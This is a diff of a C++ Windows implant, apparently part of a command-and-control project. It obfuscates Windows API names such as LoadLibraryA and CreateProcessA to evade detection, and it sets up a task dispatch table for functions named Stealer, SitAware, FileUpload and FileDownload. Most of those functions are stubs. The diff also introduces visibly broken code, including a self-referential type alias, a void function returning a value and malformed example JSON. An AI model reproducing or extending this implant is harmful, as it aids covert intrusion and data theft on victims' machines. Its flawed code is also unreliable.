@@ -8,33 +8,50 @@
 #include "obfuscate.h"
 
 using json = nlohmann::json;
+using string = string ;
 
 void task_do(json task);
 void task_dispatcher(char * body);
 
+
+
 /* declare all library names*/
-std::string AliasK32;
+string  AliasK32;
 
 
 /* declare all sneaky names*/
-std::string AliasLoadLib;
-std::string AliasCreateProcA;
-std::string AliasSleep;
-std::string AliasGetProcA;
-std::string AliasFreeLib;
-std::string AliasGetStartInfo;
+string  AliasLoadLib;
+string  AliasCreateProcA;
+string  AliasSleep;
+string  AliasGetProcA;
+string  AliasFreeLib;
+string  AliasGetStartInfo;
+
+/* global disguised loadlib */
+
+
 
 void InitStrings(){
-AliasK32 = std::string("r\\KW\\U\n♂↨]UU");
-AliasLoadLib = std::string("uVX]uP[KXK@x");
-AliasCreateProcA = std::string("zK\\XM\\iKVZ\\JJx");
-AliasSleep = std::string("jU\\\\I");
-AliasGetProcA = std::string("~\\MiKVZx]]K\\JJ");
-AliasFreeLib = std::string("⌂K\\\\uP[KXK@");
-AliasGetStartInfo =std::string( "~\\MjMXKMLIpW_Vx");
+AliasK32 = string ("r\\KW\\U\n♂↨]UU");
+AliasLoadLib = string ("uVX]uP[KXK@x");
+AliasCreateProcA = string ("zK\\XM\\iKVZ\\JJx");
+AliasSleep = string ("jU\\\\I");
+AliasGetProcA = string ("~\\MiKVZx]]K\\JJ");
+AliasFreeLib = string ("⌂K\\\\uP[KXK@");
+AliasGetStartInfo =string ( "~\\MjMXKMLIpW_Vx");
 }
 
-int getModuleEncry(std::string s,HMODULE hModule){
+void initLoadLib(){ //cant hide first call--> would need to manually do peloader
+    HMODULE hModule = LoadLibraryA("KERNEL32.dll");
+    if( hModule == NULL){
+        printf("Failed to get handle to Kernel32.dll Because of %d\n", GetLastError());
+        return -1;
+    }
+
+
+}
+
+int getModuleEncry(string  s,HMODULE hModule){
     char buf[s.size()];
     s.copy(buf, s.size(), 0);
     hide(buf);
@@ -47,7 +64,7 @@ int getModuleEncry(std::string s,HMODULE hModule){
     return 0;
 }
 
-FARPROC getProcAEncry(std::string s, FARPROC a, HMODULE hModule){
+FARPROC getProcAEncry(string  s, FARPROC a, HMODULE hModule){
     char buf[s.size()];
     s.copy(buf, s.size(), 0);
     hide(buf);
@@ -105,7 +122,7 @@ char * execute(char * program, char *args, char* outfile){
     }
     printf("after loading\n");
     _CreateProcessA f = NULL;
-    std::string s = std::string("zK\\XM\\iKVZ\\JJx");
+    string  s = string ("zK\\XM\\iKVZ\\JJx");
     char buf[s.size()];
     s.copy(buf, s.size(), 0);
     hide(buf);
@@ -155,12 +172,12 @@ char * execute(char * program, char *args, char* outfile){
 
 /* start of implant functions*/
 
-void  FileUpload(std::string args){
+void  FileUpload(string  args){
 }
 
-void FileDownload(std::string args){}
+void FileDownload(string  args){}
 
-void SitAware(std::string args){
+void SitAware(string  args){
     //implant id, computer name, usernmae, GUI, integrity, ip address, session key?, last seen
     //expected checkin -
     printf("WHOAMI\n"); 
@@ -168,14 +185,14 @@ void SitAware(std::string args){
 
 }
 
-void Stealer(std::string args){
+void Stealer(string  args){
     printf("DOING THIEVERY\n");
 }
 
 
 /* Dispatch Table Init*/
-using pfunc = void (*)(std::string);
-std::unordered_map<std::string, pfunc > dispatch_table;
+using pfunc = void (*)(string );
+std::unordered_map<string , pfunc > dispatch_table;
 
 //make global results array?
 //
@@ -230,7 +247,7 @@ void task_do(json task){
 void tasking();
 
 /* other helper functions necessary*/
-std::string readFile(char * fileName){
+string  readFile(char * fileName){
      //GetFileSize
     DWORD fileSize;
     char* buffer;
@@ -245,8 +262,8 @@ std::string readFile(char * fileName){
     buffer = (char *)malloc(size);
     
     fread(buffer,sizeof(char *), size, infile );
-    std::string buf;
-    buf = std::string(buffer);
+    string  buf;
+    buf = string (buffer);
     return buf;
     
 }
@@ -257,7 +274,7 @@ int main(int argc, char* argv[]){
     DispatchTableInit(); //create the map of strings to funcrtions
     //example of how to call the right function
     pfunc p = dispatch_table["Stealer"];
-    std::string args = "";
+    string  args = "";
     //(*p)(args);
     const char * ex = "{\"Tasks: [  {  \"{\"cmd\": \"Stealer\", \"args\": \"\"}, {  {\"cmd\": \"SitAware\", \"args\": \"\"}}  }   ]\", \"NumTasks\": 2}";
     //tasks_dispatch(ex);
